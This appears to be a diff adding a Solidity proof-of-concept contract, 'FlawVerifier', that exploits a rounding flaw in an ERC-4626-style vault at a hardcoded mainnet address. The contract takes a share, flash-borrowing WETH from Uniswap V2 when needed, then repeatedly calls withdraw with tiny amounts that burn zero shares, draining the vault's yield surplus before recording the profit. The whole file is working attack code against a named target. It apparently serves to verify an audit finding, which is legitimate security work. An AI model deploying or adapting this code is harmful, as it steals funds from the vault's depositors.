@@ -1,0 +1,322 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IEFVault {
+    function deposit(uint256 assets, address receiver) external payable returns (uint256 shares);
+    function withdraw(uint256 assets, address receiver) external returns (uint256 shares);
+    function totalAssets() external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function convertToAssets(uint256 shares) external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function maxDeposit() external view returns (uint256);
+    function maxWithdraw() external view returns (uint256);
+}
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IWETH is IERC20 {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+interface IUniswapV2Pair {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    IEFVault internal constant TARGET = IEFVault(0x863e572B215Fd67C855d973F870266cF827AEa5e);
+    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+
+    // Uniswap V2 WETH/USDC pair. This is only used to source the minimum real
+    // ETH needed to buy the first share through a deterministic flashswap.
+    // That funding step does not change exploit causality; it only bootstraps
+    // the required path stage where the attacker acquires any positive share balance.
+    IUniswapV2Pair internal constant UNI_V2_WETH_USDC =
+        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
+
+    uint256 internal _profitAmount;
+
+    constructor() {}
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external payable {
+        uint256 startingValue = _wethEquivalentBalance();
+
+        // Exploit path stage 1:
+        // Vault accrues yield so that totalAssets() > totalSupply().
+        if (!_vaultAccruedYieldSurplus()) {
+            _finalizeProfit(startingValue);
+            return;
+        }
+
+        // Exploit path stage 2:
+        // Attacker acquires any positive share balance.
+        _acquireAnyPositiveShareBalance();
+
+        if (TARGET.balanceOf(address(this)) != 0) {
+            // Exploit path stage 3:
+            // Attacker repeatedly calls withdraw() with small assets values such
+            // that convertToAssets(balanceOf(attacker)) >= assets but
+            // (totalSupply() * assets) / totalAssets() == 0.
+            _repeatedlyWithdrawSmallAssetsWithoutBurningShares();
+
+            // After the zero-burn loop has drained surplus, withdraw the
+            // legitimately owned remainder to realize profit.
+            _redeemRemainingShares();
+        }
+
+        _finalizeProfit(startingValue);
+    }
+
+    function profitToken() external pure returns (address) {
+        return address(WETH);
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        require(msg.sender == address(UNI_V2_WETH_USDC), "unauthorized pair");
+        require(sender == address(this), "unauthorized sender");
+
+        uint256 borrowedWeth = abi.decode(data, (uint256));
+        uint256 receivedWeth = amount0 > 0 ? amount0 : amount1;
+        require(receivedWeth == borrowedWeth, "unexpected flashswap");
+
+        WETH.withdraw(borrowedWeth);
+
+        bool acquiredShares = _attemptDirectDeposit(borrowedWeth);
+        require(acquiredShares, "entry deposit failed");
+
+        _repeatedlyWithdrawSmallAssetsWithoutBurningShares();
+        _redeemRemainingShares();
+
+        uint256 repayAmount = _uniswapV2RepayAmount(borrowedWeth);
+        require(address(this).balance >= repayAmount, "insufficient repay balance");
+
+        WETH.deposit{value: repayAmount}();
+        require(WETH.transfer(address(UNI_V2_WETH_USDC), repayAmount), "repay failed");
+    }
+
+    function _vaultAccruedYieldSurplus() internal view returns (bool) {
+        return TARGET.totalAssets() > TARGET.totalSupply();
+    }
+
+    function _acquireAnyPositiveShareBalance() internal {
+        if (TARGET.balanceOf(address(this)) != 0) {
+            return;
+        }
+
+        uint256 minimumAssetsForOneShare = _entryFundingNeeded();
+        if (minimumAssetsForOneShare == 0) {
+            return;
+        }
+
+        if (!_attemptDirectDeposit(minimumAssetsForOneShare)) {
+            _attemptFlashswap(minimumAssetsForOneShare);
+        }
+    }
+
+    function _repeatedlyWithdrawSmallAssetsWithoutBurningShares() internal {
+        address attacker = address(this);
+
+        for (uint256 i = 0; i < 4096; ++i) {
+            if (!_vaultAccruedYieldSurplus()) {
+                break;
+            }
+
+            if (TARGET.balanceOf(attacker) == 0) {
+                break;
+            }
+
+            uint256 assets = _smallWithdrawAmount(attacker);
+            if (assets == 0) {
+                break;
+            }
+
+            // Match the finding precisely:
+            // convertToAssets(balanceOf(attacker)) >= assets
+            if (!(TARGET.convertToAssets(TARGET.balanceOf(attacker)) >= assets)) {
+                break;
+            }
+
+            // Match the finding precisely:
+            // (totalSupply() * assets) / totalAssets() == 0
+            if (!(((TARGET.totalSupply() * assets) / TARGET.totalAssets()) == 0)) {
+                break;
+            }
+
+            (bool ok, bytes memory data) =
+                address(TARGET).call(abi.encodeWithSelector(TARGET.withdraw.selector, assets, attacker));
+            if (!ok) {
+                break;
+            }
+
+            uint256 burnedShares = data.length >= 32 ? abi.decode(data, (uint256)) : 0;
+            if (burnedShares != 0) {
+                break;
+            }
+        }
+    }
+
+    function _redeemRemainingShares() internal {
+        address attacker = address(this);
+
+        for (uint256 i = 0; i < 16; ++i) {
+            uint256 shares = TARGET.balanceOf(attacker);
+            if (shares == 0) {
+                break;
+            }
+
+            uint256 assets = TARGET.convertToAssets(shares);
+            if (assets == 0) {
+                break;
+            }
+
+            uint256 cappedAssets = assets;
+            uint256 maxWithdraw = _safeMaxWithdraw();
+            if (maxWithdraw != type(uint256).max) {
+                cappedAssets = _min(cappedAssets, maxWithdraw);
+            }
+
+            if (cappedAssets == 0) {
+                break;
+            }
+
+            (bool ok,) =
+                address(TARGET).call(abi.encodeWithSelector(TARGET.withdraw.selector, cappedAssets, attacker));
+            if (!ok) {
+                break;
+            }
+        }
+    }
+
+    function _smallWithdrawAmount(address attacker) internal view returns (uint256) {
+        uint256 totalSupply_ = TARGET.totalSupply();
+        uint256 totalAssets_ = TARGET.totalAssets();
+
+        if (totalSupply_ == 0 || totalAssets_ <= totalSupply_) {
+            return 0;
+        }
+
+        uint256 assets = (totalAssets_ - 1) / totalSupply_;
+        if (assets == 0) {
+            return 0;
+        }
+
+        uint256 entitled = TARGET.convertToAssets(TARGET.balanceOf(attacker));
+        if (entitled < assets) {
+            assets = entitled;
+        }
+
+        uint256 maxWithdraw = _safeMaxWithdraw();
+        if (maxWithdraw != type(uint256).max) {
+            assets = _min(assets, maxWithdraw);
+        }
+
+        return assets;
+    }
+
+    function _attemptDirectDeposit(uint256 assets) internal returns (bool) {
+        if (assets == 0 || address(this).balance < assets) {
+            return false;
+        }
+
+        uint256 maxDeposit = _safeMaxDeposit();
+        if (maxDeposit != type(uint256).max) {
+            assets = _min(assets, maxDeposit);
+        }
+
+        if (assets == 0 || address(this).balance < assets) {
+            return false;
+        }
+
+        uint256 sharesBefore = TARGET.balanceOf(address(this));
+        (bool ok,) =
+            address(TARGET).call{value: assets}(abi.encodeWithSelector(TARGET.deposit.selector, assets, address(this)));
+        if (!ok) {
+            return false;
+        }
+
+        return TARGET.balanceOf(address(this)) > sharesBefore;
+    }
+
+    function _attemptFlashswap(uint256 requiredEth) internal {
+        if (requiredEth == 0) {
+            return;
+        }
+
+        address token0 = UNI_V2_WETH_USDC.token0();
+        address token1 = UNI_V2_WETH_USDC.token1();
+
+        uint256 amount0Out = token0 == address(WETH) ? requiredEth : 0;
+        uint256 amount1Out = token1 == address(WETH) ? requiredEth : 0;
+        require(amount0Out != 0 || amount1Out != 0, "weth missing");
+
+        try UNI_V2_WETH_USDC.swap(amount0Out, amount1Out, address(this), abi.encode(requiredEth)) {} catch {}
+    }
+
+    function _entryFundingNeeded() internal view returns (uint256) {
+        uint256 totalSupply_ = TARGET.totalSupply();
+        uint256 totalAssets_ = TARGET.totalAssets();
+
+        if (totalSupply_ == 0) {
+            return totalAssets_ > 0 ? 1 : 0;
+        }
+
+        if (totalAssets_ <= totalSupply_) {
+            return 0;
+        }
+
+        return ((totalAssets_ - 1) / totalSupply_) + 1;
+    }
+
+    function _finalizeProfit(uint256 startingValue) internal {
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance != 0) {
+            WETH.deposit{value: ethBalance}();
+        }
+
+        uint256 endingValue = WETH.balanceOf(address(this));
+        if (endingValue > startingValue) {
+            _profitAmount = endingValue - startingValue;
+        } else {
+            _profitAmount = 0;
+        }
+    }
+
+    function _safeMaxDeposit() internal view returns (uint256) {
+        (bool ok, bytes memory data) = address(TARGET).staticcall(abi.encodeWithSelector(TARGET.maxDeposit.selector));
+        if (!ok || data.length < 32) {
+            return type(uint256).max;
+        }
+        return abi.decode(data, (uint256));
+    }
+
+    function _safeMaxWithdraw() internal view returns (uint256) {
+        (bool ok, bytes memory data) = address(TARGET).staticcall(abi.encodeWithSelector(TARGET.maxWithdraw.selector));
+        if (!ok || data.length < 32) {
+            return type(uint256).max;
+        }
+        return abi.decode(data, (uint256));
+    }
+
+    function _uniswapV2RepayAmount(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _wethEquivalentBalance() internal view returns (uint256) {
+        return WETH.balanceOf(address(this)) + address(this).balance;
+    }
+
+    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a < b ? a : b;
+    }
+}
